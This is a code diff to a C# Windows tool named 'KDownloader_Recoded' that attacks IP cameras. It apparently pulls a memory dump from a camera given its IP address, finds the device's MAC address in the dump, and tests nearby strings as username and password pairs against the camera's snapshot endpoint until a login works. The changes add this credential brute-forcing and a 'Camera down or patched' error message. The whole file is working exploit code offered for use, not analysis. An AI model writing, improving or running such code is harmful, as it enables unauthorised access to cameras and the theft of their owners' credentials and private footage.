@@ -37,10 +37,18 @@ namespace KDownloader_Recoded
         public int curOffset = 3;
         private void btn_attack_Click(object sender, EventArgs e)
         {
-            ipAddr = tb_ipaddr.Text;
-            ipAddr = processIP();
-            getMacAddr();
-            startMemDatDl();
+            try
+            {
+                lb_console.Items.Clear();
+                ipAddr = tb_ipaddr.Text;
+                ipAddr = processIP();
+                getMacAddr();
+                startMemDatDl();
+            }
+            catch
+            {
+                print(Color.Red, "Camera down or patched.");
+            }
         }
         private void kcore_Load(object sender, EventArgs e)
         {
@@ -114,10 +122,36 @@ namespace KDownloader_Recoded
             {
                 if(s == macAddr)
                 {
-                    print(Color.Green, "Mac found in mem dump!");
-                    username = rawSplit[extCount + 3];
-                    password = rawSplit[extCount + 4];
-                    announceFoundCreds();
+                    print(Color.Green, "MAC Found - Testing possible creds");
+
+                    List<String> strDump = new List<String> { };
+                    if ((rawSplit.Length - extCount) > 15)
+                    {
+                        for (int i = 0; i < 15; i++)
+                        {
+                            strDump.Add(rawSplit[extCount + i]);
+                        }
+                    }
+                    else
+                    {
+                        for (int i = 0; i < (rawSplit.Length - extCount); i++)
+                        {
+                            strDump.Add(rawSplit[extCount + i]);
+                        }
+                    }
+
+                    for(int i = 0; i < strDump.Count() - 1; i++)
+                    {
+                        Console.WriteLine("TESTING USER " + strDump[i] + " PASS " + strDump[i + 1]);
+                        if (testPossibleCreds(strDump[i], strDump[i + 1]))
+                        {
+                            username = strDump[i];
+                            password = strDump[i + 1];
+                            announceFoundCreds();
+                            break;
+                        }
+                    }
+
                     break;
                 }
                 if(s.Length == 12)
@@ -193,11 +227,25 @@ namespace KDownloader_Recoded
             }));
         }
 
+        public bool testPossibleCreds(string user, string pass)
+        {
+            w.Credentials = new NetworkCredential(user, pass);
+            try
+            {
+                w.DownloadData(ipAddr + "/snapshot.cgi");
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         private void kcore_kp(object sender, KeyPressEventArgs e)
         {
             if(e.KeyChar == 'm')
             {
-                if(rawSplit.Length != 0)
+                if(rawSplit.Length != 0 && rawSplit != null)
                 {
                     List<String> strDump = new List<String> { };
                     if((rawSplit.Length - extCount) > 15)
